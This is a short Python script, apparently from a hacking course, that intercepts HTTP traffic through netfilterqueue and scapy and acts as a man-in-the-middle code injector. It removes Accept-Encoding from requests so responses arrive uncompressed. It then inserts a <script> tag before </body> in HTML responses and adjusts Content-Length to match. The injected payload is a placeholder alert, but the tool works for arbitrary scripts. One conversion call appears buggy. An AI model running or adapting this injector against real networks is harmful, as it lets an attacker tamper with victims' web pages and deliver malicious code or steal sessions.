#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
from scapy.layers.inet6 import Raw
from scapy.layers.inet import IP, TCP
import re


def set_load(packet, load):
    packet[Raw].load = load
    del packet[IP].len
    del packet[IP].chksum
    del packet[TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(Raw):
        try:
            load = scapy_packet[Raw].load.decode()
            if scapy_packet[TCP].dport == 80:
                print("[+] Request")
                # let the server know that client doesn't accept encoded responses, so we can get cleartext
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

            elif scapy_packet[TCP].sport == 80:
                print("[+] Response")
                # inject code at the end of the body tag, so we don't interrupt the page loading
                injection_code = "<script>alert('test');</script>"
                load = load.replace("</body>", injection_code + "</body>")
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                # only recalculate content length for html pages
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))

            # executes if load gets modified
            if load != scapy_packet[Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(new_packet.encode())
        except UnicodeDecodeError:
            pass

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

